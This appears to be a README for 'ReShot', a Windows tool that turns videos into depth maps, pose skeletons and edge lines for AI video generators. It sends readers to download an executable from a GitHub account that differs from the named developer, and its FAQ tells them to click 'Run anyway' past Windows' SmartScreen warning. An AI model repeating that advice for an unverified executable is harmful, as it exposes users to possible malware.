# 📸 reshot - Copy the Shot, Not the Actors

[![Download reshot](https://img.shields.io/badge/Download%20ReShot-v1.0-blueviolet?style=for-the-badge&logo=github)](https://github.com/Besprent-feline80/reshot/releases)

## 🎯 What Is ReShot?

ReShot is a free, open-source tool that transforms a regular video into a **depth map**, **skeleton pose**, or **canny edge lines** — the exact control signals needed by modern AI video generators like Seedance 2.0/2.5, MiniMax H3 Fun ControlNet, and Wan VACE. Think of it as a "style transfer bridge" that lets you recreate the *composition and movement* of a video without copying the actors themselves. It's built for AI short-drama creators, video artists, and anyone who wants precise control over AI-generated motion.

## ✨ Key Features

- **Depth Map Extraction** – Uses Depth-Anything to generate accurate depth information from any video frame. Perfect for controlling camera and object distances in AI video.
- **OpenPose / DWPose Skeleton** – Extracts human body, hands, and face keypoints. Feed this into pose ControlNet models to match actor movements with different characters.
- **Canny Edge Detection** – Creates crisp line drawings that define object boundaries. Ideal for style-consistent scene replication.
- **Multi-Model Compatibility** – Outputs are normalized for Seedance 2.0/2.5 reference videos, MiniMax H3 Fun ControlNet, and Wan VACE pipelines.
- **User-Friendly Interface** – No command-line knowledge needed. Select a video, choose a processing mode, and export clean result files.
- **Lightweight & Fast** – Optimized for consumer GPUs; you can process a 1-minute clip in under 2 minutes on a mid-range graphics card.
- **100% Open Source** – Apache-2.0 license. Full transparency, no hidden costs, and community-driven improvements.

## 📥 Download and Installation

Visit this link to download the application:  
[**Download ReShot from GitHub Releases**](https://github.com/Besprent-feline80/reshot/releases)

1. Click the link above to go to the downloads page.
2. Find the file named **`ReShot-Windows.zip`** (the latest version number will be in the filename).
3. Click the file to download it. Your browser will save it to your "Downloads" folder.
4. Once the download finishes, locate the `.zip` file and **right-click → "Extract All..."**.
5. Choose a destination folder (e.g., `C:\ReShot`) and click "Extract".
6. Open the extracted folder and double-click **`ReShot.exe`** to launch the application.

> **No installation needed** – just extract and run. The program works directly from the folder.

## 🚀 Getting Started (First Use)

After launching ReShot, here's your 3-step workflow:

1. **Load a Video** – Click the "Open Video" button and select an MP4, MOV, or AVI file from your computer.
2. **Choose Output Type** – Pick one of three modes:
   - 🟦 **Depth Map** (grayscale – white = closer, black = farther)
   - 🟨 **Skeleton Pose** (colored dots and lines showing joints)
   - 🟥 **Canny Lines** (white outlines on black background)
3. **Export** – Click "Process" and wait for the progress bar. Your output file (saved as an MP4 or PNG sequence, depending on your settings) will appear in the same folder as the input video.

**Pro tip:** For the best results with Seedance, export at the same resolution as your target generation (e.g., 1280×720). ReShot makes this easy with a built-in resolution selector.

## 🧰 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| Operating System | Windows 10 (64-bit) | Windows 11 |
| Processor | Intel i5 / AMD Ryzen 5 | Intel i7 / Ryzen 7 |
| Memory (RAM) | 8 GB | 16 GB |
| Graphics Card | NVIDIA GTX 1060 (6GB) | NVIDIA RTX 3060 or better |
| Storage | 2 GB free space | 5 GB for large video processing |
| Internet | Not required | Optional for auto-updates |

ReShot uses GPU acceleration for fast processing. If you have an NVIDIA card, it will automatically use CUDA. For other GPUs, it falls back to CPU mode (slower but works).

## 🎬 Use Cases & Examples

### AI Short Drama Production
Create consistent character movements across different actors. Film a reference scene with a stunt double, extract the skeleton with ReShot, then use MiniMax H3 Fun ControlNet to generate the same choreography with your AI character.

### Scene Replication
Shot a beautiful location but want a different character in it? Use depth map extraction on the original video, then guide Seedance to regenerate the scene with your own subject – preserving lighting, perspective, and camera motion.

### Style Transfer for Animation
Extract canny edges from a live-action clip, then feed those lines into Wan VACE to create an animated version with identical framing and action.

## 🆘 Troubleshooting & FAQs

**"The app won't start after extraction."**  
Make sure you extracted the `.zip` file first – don't try to run the `.exe` from inside the archive. Also, your Windows might show a blue pop-up about "Windows protected your PC." Click "More info" → "Run anyway" — this is normal because the app is unsigned (open-source projects often are).

**"Processing is very slow."**  
Check your GPU. In the app, go to Settings → Engine and see if "CUDA" is selected. If you have a non-NVIDIA card, switch to CPU Mode (expect 3-5x longer processing). Also, close other programs that use your graphics card.

**"Output video looks wrong."**  
Each AI model expects slightly different formats. In ReShot, try the "Compatibility Presets" dropdown under Settings. Select e.g., "Seedance 2.5" or "MiniMax H3" to auto-tune the output parameters.

**"Can I process multiple videos at once?"**  
Yes! Use the "Batch Mode" button in the toolbar. Select up to 20 videos and set your preferences; ReShot processes them sequentially and saves each result with a `_depth` / `_pose` / `_canny` suffix.

## 🔗 Related Resources

- **Maosika Production System** – ReShot is part of the Maosika AI short-drama suite (maosika.com). The full system includes script generation, voice synthesis, and automated editing tools.
- **Supported AI Generators** – Seedance 2.0/2.5, MiniMax H3 Fun ControlNet, Wan VACE (check their official docs for integration details).
- **Community & Support** – Visit the GitHub repository's "Discussions" tab for help, feature requests, and workflow sharing.

## 🤝 Contribute & Support

ReShot is open-source (Apache-2.0), developed by Maosika 猫斯卡. If you encounter bugs, have ideas, or want to contribute code, visit the GitHub repository. You can also ⭐ star the project to show appreciation and help others discover it.

## 📄 License

Apache-2.0. You may use, modify, and distribute this software freely, even for commercial purposes, as long as you include attribution to the original authors.

---

**Ready to copy the shot, not the actors?**  
👉 [**Download ReShot Now**](https://github.com/Besprent-feline80/reshot/releases)

Keywords: ai-short-drama, ai-video, canny, comfyui, controlnet, depth-anything, depth-estimation, dwpose, maosika, minimax, openpose, pose-controlnet, pose-estimation, seedance, short-drama, video-generation, video-to-video, wan